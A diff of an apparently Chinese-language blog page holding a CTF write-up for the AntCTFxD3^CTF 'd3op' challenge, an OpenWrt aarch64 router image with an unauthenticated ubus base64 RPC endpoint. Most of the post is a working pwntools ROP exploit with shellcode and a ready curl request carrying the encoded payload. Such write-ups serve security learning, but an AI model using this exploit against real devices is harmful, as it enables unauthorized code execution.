@@ -1,80 +1,164 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
-    
-<link rel="stylesheet" href="/css/reset.css">
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    
-<link rel="stylesheet" href="/css/style.css">
+    <meta name="author" content="Loora1N">
 
-    
-<link rel="stylesheet" href="/css/markdown.css">
 
-    
-<link rel="stylesheet" href="/css/fonts.css">
 
-<meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
-                
-                    <div class="post-header">
-    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
-    <a class="go-home" href="/">
-        <svg width="8" height="14" viewBox="0 0 8 14">
-            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-    </a>
+    <meta name="description" content="Blog of Loora1N">
+
+
+
+
+
+<title>【WP】AntCTFxD3^CTF d3op | Loora1N&#39;s Blog | 鹭雨</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/menu.js"></script>
+    
+    <script src="/js/highlight.min.js"></script>
+    
+    <script src="/js/highlightjs-line-numbers.js"></script>
+    
+    <script src="/js/format.js"></script>
+    
+    <script src="/js/search.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.2.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Loora1N&#39;s Blog | 鹭雨
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">首页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">索引</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">述己</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/links/">友链</a>
+              </li> 
+                   
+          
+          
+            <li class="menu-item search-btn">
+              <a href="#">Search</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
 </div>
-                
-                <div class="post-main">
 
-    
-    
-        <div class="post-main-title">
-            【WP】AntCTFxD3^CTF d3op
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
         </div>
-        <div class="post-meta">
-            2023-05-16
+        <div class="post-title">
+            
+            
+                【WP】AntCTFxD3^CTF d3op
+            
+            
         </div>
-        <div class="post-md">
-            <blockquote>
+        <span class="post-date">
+            5月 16, 2023
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <blockquote>
 <p>本文采取根据官方wp的方式进行复现，需要官方WP的pdf文件也可以在评论区留言（侵删）</p>
 </blockquote>
 <h2 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h2><p>首先解压文件系统</p>
-<pre><code class="bash">mkdir rootfs
-cd rootfs
-unsquashfs ../unsquashfs ../squashfs-root.img  
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line">unsquashfs ../unsquashfs ../squashfs-root.img  </span><br></pre></td></tr></table></figure>
+
 <p>在<code>etc/os-release</code>中我们能看到版本信息</p>
-<pre><code>NAME=&quot;OpenWrt&quot;
-VERSION=&quot;22.03.3&quot;
-ID=&quot;openwrt&quot;
-ID_LIKE=&quot;lede openwrt&quot;
-PRETTY_NAME=&quot;OpenWrt 22.03.3&quot;
-VERSION_ID=&quot;22.03.3&quot;
-HOME_URL=&quot;https://openwrt.org/&quot;
-BUG_URL=&quot;https://bugs.openwrt.org/&quot;
-SUPPORT_URL=&quot;https://forum.openwrt.org/&quot;
-BUILD_ID=&quot;r20028-43d71ad93e&quot;
-OPENWRT_BOARD=&quot;armvirt/64&quot;
-OPENWRT_ARCH=&quot;aarch64_cortex-a53&quot;
-OPENWRT_TAINTS=&quot;&quot;
-OPENWRT_DEVICE_MANUFACTURER=&quot;OpenWrt&quot;
-OPENWRT_DEVICE_MANUFACTURER_URL=&quot;https://openwrt.org/&quot;
-OPENWRT_DEVICE_PRODUCT=&quot;Generic&quot;
-OPENWRT_DEVICE_REVISION=&quot;v0&quot;
-OPENWRT_RELEASE=&quot;OpenWrt 22.03.3 r20028-43d71ad93e&quot;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">NAME=&quot;OpenWrt&quot;</span><br><span class="line">VERSION=&quot;22.03.3&quot;</span><br><span class="line">ID=&quot;openwrt&quot;</span><br><span class="line">ID_LIKE=&quot;lede openwrt&quot;</span><br><span class="line">PRETTY_NAME=&quot;OpenWrt 22.03.3&quot;</span><br><span class="line">VERSION_ID=&quot;22.03.3&quot;</span><br><span class="line">HOME_URL=&quot;https://openwrt.org/&quot;</span><br><span class="line">BUG_URL=&quot;https://bugs.openwrt.org/&quot;</span><br><span class="line">SUPPORT_URL=&quot;https://forum.openwrt.org/&quot;</span><br><span class="line">BUILD_ID=&quot;r20028-43d71ad93e&quot;</span><br><span class="line">OPENWRT_BOARD=&quot;armvirt/64&quot;</span><br><span class="line">OPENWRT_ARCH=&quot;aarch64_cortex-a53&quot;</span><br><span class="line">OPENWRT_TAINTS=&quot;&quot;</span><br><span class="line">OPENWRT_DEVICE_MANUFACTURER=&quot;OpenWrt&quot;</span><br><span class="line">OPENWRT_DEVICE_MANUFACTURER_URL=&quot;https://openwrt.org/&quot;</span><br><span class="line">OPENWRT_DEVICE_PRODUCT=&quot;Generic&quot;</span><br><span class="line">OPENWRT_DEVICE_REVISION=&quot;v0&quot;</span><br><span class="line">OPENWRT_RELEASE=&quot;OpenWrt 22.03.3 r20028-43d71ad93e&quot;</span><br></pre></td></tr></table></figure>
+
 <p>根据题目提示<code>May be you need to do a diff with the rootfs in attachment.</code>，我们可以利用其中的关键词，从openwrt中搜索到官方的文件系统，解压后进行diff比较</p>
-<pre><code class="bash">cd rootfs
-unsquashfs ../openwrt-22.03.3-armvirt-64-rootfs-squashfs.img
-diff -r squashfs-root squashfs-root-d3op 
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line">unsquashfs ../openwrt-22.03.3-armvirt-64-rootfs-squashfs.img</span><br><span class="line">diff -r squashfs-root squashfs-root-d3op </span><br></pre></td></tr></table></figure>
+
 <p>可得如下图结果</p>
 <p><img src="/img/article/d3op/image-20230507175322524.png" alt="image-20230507175322524"></p>
 <p>可以看到题目的文件系统多了对二进制文件base64，以及其对应的ubus的rpc接口，且这个接口可以未经身份验证访问。</p>
@@ -98,116 +182,103 @@ diff -r squashfs-root squashfs-root-d3op
 <li>利用溢出构造arm64架构下的ROP</li>
 <li>转成base64后用访问对应api接口即可</li>
 </ul>
-<h3 id="构造ROP以及base64转换部分"><a href="#构造ROP以及base64转换部分" class="headerlink" title="构造ROP以及base64转换部分"></a>构造ROP以及base64转换部分</h3><pre><code class="python">from pwn import *
-import base64
-# context.log_level = &quot;debug&quot;
-context.arch = &quot;aarch64&quot;
-# p = process([&quot;./base64&quot;, &quot;decode&quot;])
-# elf = ELF(&quot;./elf&quot;)
-# libc = ELF(&quot;./libc.so.6&quot;)
-# 0x00000000004494b8 : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
-set_x0 = 0x00000000004494b8
-# 0x00000000004010ec : ldr x1, [sp, #0x28] ; add x0, x1, x0 ; ldp x29, x30, [sp],
-#0x30 ; ret
-set_x1 = 0x00000000004010ec
-# call mprotect(x0[0x92] + x0[0x94], x0[0x93] - x0[0x94], 7)
-call_mprotect = 0x00000000004579A4
-shellcode = shellcraft.aarch64.linux.open(&quot;/flag&quot;, 0)
-shellcode += shellcraft.aarch64.linux.read(3, 0x4a23a4, 0x100)
-shellcode += &#39;&#39;&#39;
-    MOV X3, X0
-    LDR X1, =0x22
-    LDR X2, =0x4a23a3
-    STRB W1, [X3, X2]
-    LDR X1, =0x7d
-    LDR X2, =0x4a23a4
-    STRB W1, [X3, X2]
-&#39;&#39;&#39;
-shellcode += shellcraft.aarch64.linux.write(1, 0x4a2398, 0x100)
-shellcode += &#39;&#39;&#39;
-    LDR X0, =1
-    LDR X9, =0x422D60
-    BLR X9
-&#39;&#39;&#39;
-payload = asm(shellcode,bits = 64)
-payload = payload.ljust(0x200, b&quot;\x00&quot;)
-payload += p64(0)
-payload += p64(0x4A3000)
-payload += p64(0x4A2000)
-payload = payload.ljust(0x300, b&quot;\x00&quot;)
-payload += b&quot;&#123;\&quot;output\&quot;: \&quot;&quot;
-payload = payload.ljust(0x400, b&quot;\x00&quot;)
-payload += b&quot;A\x00\x00\x00&quot; # char1
-payload += b&quot;A\x00\x00\x00&quot; # char2
-payload += b&quot;A\x00\x00\x00&quot; # char3
-payload += b&quot;A\x00\x00\x00&quot; # char3
-payload += b&quot;A\x00\x00\x00&quot; # char4
-payload += b&quot;A\x00\x00\x00&quot; # char4
-payload += b&quot;\x18\x06\x00\x00&quot; # input lenght
-payload += b&quot;\x1d\x04\x00\x00&quot; # output idx
-payload += b&quot;\x84\x05\x00\x00&quot; # input idx
-payload += b&quot;\x92\x04\x00\x00&quot; # output length
-payload += p64(0x4A2500) # x29
-payload += p64(set_x0) # x30
-payload += p64(0) * 4
-payload += p64(0x4A2500) # x29
-payload += p64(call_mprotect) # x30
-payload += p64(0x4A2298 - 0x490) # x0
-payload += b&quot;BBBBBBBB&quot;
-payload += b&quot;CCCCCCCC&quot;
-payload += p64(0x4A2098)
-payload += b&quot;EEEEEEEE&quot;
-# p.sendline()
-# p.interactive()
-payload = base64.b64encode(payload)
-print(payload)
-</code></pre>
-<h3 id="shell脚本访问api接口"><a href="#shell脚本访问api接口" class="headerlink" title="shell脚本访问api接口"></a>shell脚本访问api接口</h3><pre><code>curl --location &#39;http://127.0.0.1:9999/ubus&#39; \
-    --header &#39;Content-Type: application/json&#39; \
-    --data &#39;&#123;
-        &quot;jsonrpc&quot;: &quot;2.0&quot;,
-        &quot;id&quot;: 1,
-        &quot;method&quot;: &quot;call&quot;,
-        &quot;params&quot;: [
-            &quot;00000000000000000000000000000000&quot;,
-            &quot;base64&quot;,
-            &quot;decode&quot;,
-            &#123;
-                &quot;input&quot;:
-                &quot;7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADU4wMAquEBAFgCAgBYYWgiOAECAFgiAgBYYWgiOCAAgNIBc4TSQQmg8gIggNIICIDSAQAA1GABAFiJAQBYIAE/1iIAAAAAAAAAoyNKAAAAAAB9AAAAAAAAAKQjSgAAAAAAAQAAAAAAAABgLUIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwSgAAAAAAACBKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeyJvdXRwdXQiOiAiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEEAAABBAAAAQQAAAEEAAABBAAAAQQAAABgGAAAdBAAAhAUAAJIEAAAAJUoAAAAAALiURAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJUoAAAAAAKR5RQAAAAAACB5KAAAAAABCQkJCQkJCQkNDQ0NDQ0NDmCBKAAAAAABFRUVFRUVFRQ==&quot;
-            &#125;
-        ]
-    &#125;&#39;
-</code></pre>
+<h3 id="构造ROP以及base64转换部分"><a href="#构造ROP以及base64转换部分" class="headerlink" title="构造ROP以及base64转换部分"></a>构造ROP以及base64转换部分</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;aarch64&quot;</span></span><br><span class="line"><span class="comment"># p = process([&quot;./base64&quot;, &quot;decode&quot;])</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;./elf&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># 0x00000000004494b8 : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line">set_x0 = <span class="number">0x00000000004494b8</span></span><br><span class="line"><span class="comment"># 0x00000000004010ec : ldr x1, [sp, #0x28] ; add x0, x1, x0 ; ldp x29, x30, [sp],</span></span><br><span class="line"><span class="comment">#0x30 ; ret</span></span><br><span class="line">set_x1 = <span class="number">0x00000000004010ec</span></span><br><span class="line"><span class="comment"># call mprotect(x0[0x92] + x0[0x94], x0[0x93] - x0[0x94], 7)</span></span><br><span class="line">call_mprotect = <span class="number">0x00000000004579A4</span></span><br><span class="line">shellcode = shellcraft.aarch64.linux.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.aarch64.linux.read(<span class="number">3</span>, <span class="number">0x4a23a4</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    MOV X3, X0</span></span><br><span class="line"><span class="string">    LDR X1, =0x22</span></span><br><span class="line"><span class="string">    LDR X2, =0x4a23a3</span></span><br><span class="line"><span class="string">    STRB W1, [X3, X2]</span></span><br><span class="line"><span class="string">    LDR X1, =0x7d</span></span><br><span class="line"><span class="string">    LDR X2, =0x4a23a4</span></span><br><span class="line"><span class="string">    STRB W1, [X3, X2]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.aarch64.linux.write(<span class="number">1</span>, <span class="number">0x4a2398</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    LDR X0, =1</span></span><br><span class="line"><span class="string">    LDR X9, =0x422D60</span></span><br><span class="line"><span class="string">    BLR X9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(shellcode,bits = <span class="number">64</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x4A3000</span>)</span><br><span class="line">payload += p64(<span class="number">0x4A2000</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x300</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += <span class="string">b&quot;&#123;\&quot;output\&quot;: \&quot;&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += <span class="string">b&quot;A\x00\x00\x00&quot;</span> <span class="comment"># char1</span></span><br><span class="line">payload += <span class="string">b&quot;A\x00\x00\x00&quot;</span> <span class="comment"># char2</span></span><br><span class="line">payload += <span class="string">b&quot;A\x00\x00\x00&quot;</span> <span class="comment"># char3</span></span><br><span class="line">payload += <span class="string">b&quot;A\x00\x00\x00&quot;</span> <span class="comment"># char3</span></span><br><span class="line">payload += <span class="string">b&quot;A\x00\x00\x00&quot;</span> <span class="comment"># char4</span></span><br><span class="line">payload += <span class="string">b&quot;A\x00\x00\x00&quot;</span> <span class="comment"># char4</span></span><br><span class="line">payload += <span class="string">b&quot;\x18\x06\x00\x00&quot;</span> <span class="comment"># input lenght</span></span><br><span class="line">payload += <span class="string">b&quot;\x1d\x04\x00\x00&quot;</span> <span class="comment"># output idx</span></span><br><span class="line">payload += <span class="string">b&quot;\x84\x05\x00\x00&quot;</span> <span class="comment"># input idx</span></span><br><span class="line">payload += <span class="string">b&quot;\x92\x04\x00\x00&quot;</span> <span class="comment"># output length</span></span><br><span class="line">payload += p64(<span class="number">0x4A2500</span>) <span class="comment"># x29</span></span><br><span class="line">payload += p64(set_x0) <span class="comment"># x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x4A2500</span>) <span class="comment"># x29</span></span><br><span class="line">payload += p64(call_mprotect) <span class="comment"># x30</span></span><br><span class="line">payload += p64(<span class="number">0x4A2298</span> - <span class="number">0x490</span>) <span class="comment"># x0</span></span><br><span class="line">payload += <span class="string">b&quot;BBBBBBBB&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;CCCCCCCC&quot;</span></span><br><span class="line">payload += p64(<span class="number">0x4A2098</span>)</span><br><span class="line">payload += <span class="string">b&quot;EEEEEEEE&quot;</span></span><br><span class="line"><span class="comment"># p.sendline()</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
 
+<h3 id="shell脚本访问api接口"><a href="#shell脚本访问api接口" class="headerlink" title="shell脚本访问api接口"></a>shell脚本访问api接口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">curl --location &#x27;http://127.0.0.1:9999/ubus&#x27; \</span><br><span class="line">    --header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">    --data &#x27;&#123;</span><br><span class="line">        &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">        &quot;id&quot;: 1,</span><br><span class="line">        &quot;method&quot;: &quot;call&quot;,</span><br><span class="line">        &quot;params&quot;: [</span><br><span class="line">            &quot;00000000000000000000000000000000&quot;,</span><br><span class="line">            &quot;base64&quot;,</span><br><span class="line">            &quot;decode&quot;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;input&quot;:</span><br><span class="line">                &quot;7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADU4wMAquEBAFgCAgBYYWgiOAECAFgiAgBYYWgiOCAAgNIBc4TSQQmg8gIggNIICIDSAQAA1GABAFiJAQBYIAE/1iIAAAAAAAAAoyNKAAAAAAB9AAAAAAAAAKQjSgAAAAAAAQAAAAAAAABgLUIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwSgAAAAAAACBKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeyJvdXRwdXQiOiAiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEEAAABBAAAAQQAAAEEAAABBAAAAQQAAABgGAAAdBAAAhAUAAJIEAAAAJUoAAAAAALiURAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJUoAAAAAAKR5RQAAAAAACB5KAAAAAABCQkJCQkJCQkNDQ0NDQ0NDmCBKAAAAAABFRUVFRUVFRQ==&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2023/07/10/%E6%9F%90%E5%B8%82%E7%94%B5%E7%BD%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/">Prev</a>
+                </div>
+            
         </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
 
+    
+      <div class="post-comment">
+
+     
+
+     
+    
     
 
 </div>
-                <div class="footer">
-    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
 </div>
 
+    </div>
 
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
-
-
-<script src="/js/highlight.min.js"></script>
-
-
-<script src="/js/highlightjs-line-numbers.js"></script>
-
-
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
-
+    
+      <div class="search-popup">
+    <div class="search-popup-overlay">  
+    </div>
+    <div class="search-popup-window" >
+        <div class="search-header">
+            <div class="search-input-container">
+              <input autocomplete="off" autocapitalize="off" maxlength="80"
+                     placeholder="Search Anything" spellcheck="false"
+                     type="search" class="search-input">
+            </div>
+            <div class="search-close-btn">
+                <div class="icon close-btn"></div>
             </div>
         </div>
-    <!-- hexo injector body_end start -->
+        <div class="search-result-container">
+        </div>
+    </div>
+</div>
+
+<script>
+    const searchConfig = {
+        path             : "/search.xml",
+        top_n_per_article: "1",
+        unescape         : "false",
+        trigger: "auto",
+        preload: "false"
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/search.js"></script>
+    
+    
+
+  <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
